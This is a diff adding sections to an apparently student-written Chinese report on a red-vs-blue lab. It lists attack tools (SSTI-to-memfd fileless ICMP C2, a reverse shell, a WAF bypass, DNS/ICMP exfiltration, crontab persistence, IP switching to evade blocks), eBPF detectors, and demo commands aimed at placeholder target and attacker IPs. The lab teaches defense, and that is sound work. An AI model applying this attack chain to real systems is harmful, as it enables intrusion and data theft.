@@ -15,8 +15,11 @@
 2. [背景知識與分析框架](#2-背景知識與分析框架)
 3. [問題描述與攻擊手法](#3-問題描述與攻擊手法)
 4. [提出的解決方案](#4-提出的解決方案)
-5. [結論](#5-結論)
-6. [參考文獻](#6-參考文獻)
+5. [工具清單與環境配置](#5-工具清單與環境配置)
+6. [攻擊演示流程](#6-攻擊演示流程)
+7. [預期挑戰與風險](#7-預期挑戰與風險)
+8. [結論](#8-結論)
+9. [參考文獻](#9-參考文獻)
 
 ---
 
@@ -306,7 +309,180 @@ Covert C2 channel 的加密從 XOR 升級到 AES-256-CTR：
 
 ---
 
-## 5. 結論
+## 5. 工具清單與環境配置
+
+### 5.1 雙機架構
+
+因為 WSL2 沒有 kernel headers，eBPF 沒辦法在上面編譯。紅隊工具不需要 eBPF，所以跑在 WSL2 上沒問題。
+
+| 機器 | 角色 | 系統 | 跑什麼 |
+|------|------|------|--------|
+| Lab 機器 | 靶機 + 藍隊 | Ubuntu 24.04（native） | target_app.py、honeypot.py、eBPF MDR、SOC dashboard |
+| 同學筆電 | 紅隊（攻擊機） | Ubuntu 22.04（WSL2） | recon、exploit、C2 server、reverse shell listener |
+
+兩台機器都跑 `bash setup_env.sh`，它會自動偵測 WSL2 然後裝對應的 package。Python 用 `.venv/` 做 venv 隔離。
+
+### 5.2 紅隊工具
+
+| 工具 | 檔案 | 用途 | 需要 sudo |
+|------|------|------|-----------|
+| Fileless ICMP C2 | `red_team/red_attacker.py` | 主力攻擊：SSTI → memfd_create → AES-256-CTR ICMP C2 | 要（raw ICMP socket） |
+| TCP Reverse Shell | `red_team/red_reverse_shell.py` | 繞過 eBPF v1：fork → connect → dup2 → pty.spawn | 不用 |
+| WAF Bypass | `red_team/exploit.py` | 備用：Base64 + `${IFS}` 空格繞過 | 不用 |
+| Recon Script | `red_team/recon.sh` | nmap 自動化掃描 | 看 scan type |
+| IP Switch | `red_team/ip_switch.sh` | IP alias add/remove，繞過 iptables 封鎖 | 要 |
+| Exfil Agent | `red_team/exfil_agent.py` | 部署在靶機上：蒐集檔案，透過 DNS/ICMP 外傳 | 不用 |
+| Exfil Listener | `red_team/exfil_listener.py` | 跑在攻擊機上：假 DNS server + ICMP 接收器 | 要（port 53 + raw ICMP） |
+| Deploy Helper | `red_team/deploy_agent.sh` | 產生 base64 一行指令來部署 exfil agent | 不用 |
+| Post-Exploit | `red_team/post_exploit.sh` | 系統資訊蒐集 + crontab 持久化 | 不用 |
+
+### 5.3 藍隊工具
+
+| 工具 | 檔案 | 用途 | 需要 sudo |
+|------|------|------|-----------|
+| eBPF MDR v1 | `blue_team/blue_ebpf_mdr.py` | 3 個 syscall hook：memfd_create、execve、socket | 要（eBPF） |
+| eBPF MDR v2 | `blue_team/blue_ebpf_mdr_v2.py` | 6 個 hook：v1 + connect、dup2、dup3 | 要（eBPF） |
+| Network MDR | `blue_team/blue_mdr_network.py` | 監控 trap.log → 自動 iptables 封鎖 | 要（iptables） |
+| SOC Dashboard | `blue_team/soc_dashboard.py` | Real-time web UI，port 8080 | 不用 |
+
+### 5.4 靶機服務
+
+| 服務 | 檔案 | Port | 用途 |
+|------|------|------|------|
+| Diagnostic API | `target/target_app.py` | 9999 | 有 SSTI 漏洞的 Flask app（真正的攻擊目標） |
+| SSH Honeypot | `target/honeypot.py` | 2222 | 假 SSH server，記錄 IP 到 trap.log（欺敵陷阱） |
+
+### 5.5 外部依賴
+
+| 依賴 | 誰在用 | 備註 |
+|------|--------|------|
+| nmap | recon.sh | Port scanning，apt 裝 |
+| BCC (python3-bpfcc) | eBPF MDR v1/v2 | eBPF compiler，只在 native Linux 上裝 |
+| linux-headers | eBPF MDR v1/v2 | eBPF 編譯需要，WSL2 沒有 |
+| OpenSSL libcrypto | red_attacker.py | AES-256-CTR 加密，Linux 都有預裝 |
+| Flask | target_app.py、soc_dashboard.py | Web framework，裝在 venv 裡 |
+| netcat (nc) | 手動測試 | 用來觸發 honeypot，通常系統有 |
+
+---
+
+## 6. 攻擊演示流程
+
+整個 demo 大概 20-25 分鐘，7 個回合。以下是簡化版的指令流程，完整版（含 expected output）在 `docs/DEMO_FLOW.md`。
+
+### 準備（所有終端都要）
+
+```bash
+cd ~/cybersecurity && source .venv/bin/activate
+```
+
+### 回合 1 — 偵察 + 蜜罐陷阱
+
+```bash
+# Lab T1：啟動靶機 + 蜜罐
+sudo .venv/bin/python3 target/target_app.py
+sudo .venv/bin/python3 target/honeypot.py
+
+# Lab T2：啟動網路 MDR
+sudo .venv/bin/python3 blue_team/blue_mdr_network.py --cleanup
+
+# WSL2 T4：掃描目標
+bash red_team/recon.sh <TARGET_IP>
+# → 發現 port 2222（蜜罐）和 9999（真正目標）
+
+# WSL2 T4：碰蜜罐 → 被封鎖
+nc -v <TARGET_IP> 2222
+# → MDR 自動用 iptables 封鎖攻擊者 IP
+
+# WSL2 T4：用 IP alias 繞過
+bash red_team/ip_switch.sh add
+# → 新 IP 沒被封鎖，可以繼續打
+```
+
+### 回合 2 — 紅隊攻擊成功（藍隊 OFF）
+
+```bash
+# WSL2 T3：啟動 C2 server
+sudo .venv/bin/python3 red_team/red_attacker.py -t <TARGET_IP> -l <ATTACKER_IP>
+
+# WSL2 T4：貼上 T3 印出來的 curl 指令
+curl -s -X POST http://<TARGET_IP>:9999/diag -d "query=..."
+# → agent 在記憶體中部署完成，拿到 C2 shell
+```
+
+### 回合 3-4 — 藍隊部署 eBPF v1
+
+```bash
+# Lab T2：啟動 eBPF v1
+sudo .venv/bin/python3 blue_team/blue_ebpf_mdr.py --kill
+# → cold-start scan 找到並 kill 現有 agent
+# → 紅隊再攻擊會在 memfd_create 就被攔截
+```
+
+### 回合 5 — 紅隊用 Reverse Shell 繞過 v1
+
+```bash
+# WSL2 T3：切換到 reverse shell 攻擊
+.venv/bin/python3 red_team/red_reverse_shell.py -t <TARGET_IP> -l <ATTACKER_IP>
+
+# WSL2 T4：貼 curl → reverse shell 連上
+# → eBPF v1 完全沒反應（沒 memfd、沒 ICMP、沒 /proc/fd exec）
+```
+
+### 回合 6 — 藍隊升級到 eBPF v2
+
+```bash
+# Lab T2：升級到 v2
+sudo .venv/bin/python3 blue_team/blue_ebpf_mdr_v2.py --kill
+
+# WSL2 T4：再打一次 reverse shell
+# → v2 偵測到 connect() port 4444 + dup2 fd hijack → SIGKILL
+```
+
+---
+
+## 7. 預期挑戰與風險
+
+### 7.1 環境與相容性問題
+
+| 挑戰 | 描述 | 我們的對策 |
+|------|------|-----------|
+| WSL2 沒有 kernel headers | eBPF 在 WSL2 上編譯不了（Microsoft 的 WSL2 kernel 沒附 headers） | 拆成雙機架構：紅隊在 WSL2（不需要 eBPF），藍隊在 native Linux |
+| BCC 版本不一致 | BCC API 在 Ubuntu 22.04 和 24.04 之間有差異 | 統一用 apt 的 `python3-bpfcc`；兩個版本都測過 |
+| OpenSSL library 路徑不同 | `ctypes.util.find_library('crypto')` 在不同 distro 回傳的路徑可能不一樣 | 用 fallback chain：先試 `find_library('crypto')`，再試 `libcrypto.so`，最後試 `libcrypto.so.3` |
+| venv 跟系統 BCC 衝突 | BCC 是系統 package 但 venv 預設會隔離 | 建 venv 時用 `--system-site-packages` 讓 BCC 能被存取 |
+
+### 7.2 攻擊執行的問題
+
+| 挑戰 | 描述 | 我們的對策 |
+|------|------|-----------|
+| ICMP 可能被擋 | 有些 lab 的 gateway 會擋 ICMP | 先用 `ping` 測；如果被擋，reverse shell（TCP）攻擊照樣能打 |
+| Flask 要用 root 跑 | SSTI → memfd_create 攻擊鏈需要 Flask process 有 `CAP_NET_RAW` 才能開 ICMP raw socket | Lab 環境下用 sudo 跑 Flask；文件中有說明這是 lab 的簡化做法 |
+| trap.log 路徑不一致 | 如果 honeypot 和 MDR 用不同的 trap.log 路徑，MDR 就看不到新 entry | 兩個 script 都自動解析到 project root 的絕對路徑 |
+| eBPF verifier 拒絕載入 | eBPF 有嚴格限制（不能有無界迴圈、stack 最多 512 bytes） | 所有 loop 都用固定次數的 bounded loop；每個 hook 的邏輯保持簡單 |
+
+### 7.3 防禦的已知限制（刻意保留）
+
+以下不是 bug，而是我們刻意保留的限制，目的是讓 demo 能展示攻防升級：
+
+| 限制 | 為什麼留著 | 展示什麼 |
+|------|-----------|----------|
+| Honeypot 只封鎖已知 IP | 攻擊者換 IP 就能繞過 | 網路層防禦光靠自己不夠 |
+| eBPF v1 只監控 3 個 syscall | Reverse shell 用的是不同的 syscall | 防禦者必須持續擴展監控面 |
+| Suspicious port list 是寫死的 | Reverse shell 用 port 80/443 就能繞過 port detection | 但 dup2/dup3 行為偵測還是抓得到 |
+| Shared secret 是 hardcoded | 在 production 這會是漏洞 | Lab 環境；我們 focus 在偵測面，不是金鑰管理 |
+
+### 7.4 Demo 當天的風險
+
+| 風險 | 影響 | 備案 |
+|------|------|------|
+| 兩台機器之間網路不通 | 跨機器攻擊打不出去 | 先用 `ping` 和 `curl` 測；準備一個用 localhost 跑的 single-machine fallback |
+| eBPF 載入失敗 | 藍隊 demo 爆掉 | 準備一段預先錄好的 terminal session 當備案 |
+| Port 衝突（2222、9999、8080） | 服務 bind 不了 | Demo 前先跑 `cleanup.sh` 殺掉殘留 process |
+| 上一次 demo 的殘留影響這次 | MDR 跳過舊 entry；stale iptables 規則還在 | 每次都先跑 `sudo bash cleanup.sh` |
+
+---
+
+## 8. 結論
 
 這個專案透過 7 回合的紅藍隊對抗，驗證了幾個我們認為很重要的觀察：
 
@@ -324,7 +500,7 @@ Covert C2 channel 的加密從 XOR 升級到 AES-256-CTR：
 
 ---
 
-## 6. 參考文獻
+## 9. 參考文獻
 
 [1] IBM Security，「資料外洩成本報告 2024」，IBM Corporation，2024。取自：https://www.ibm.com/reports/data-breach
 
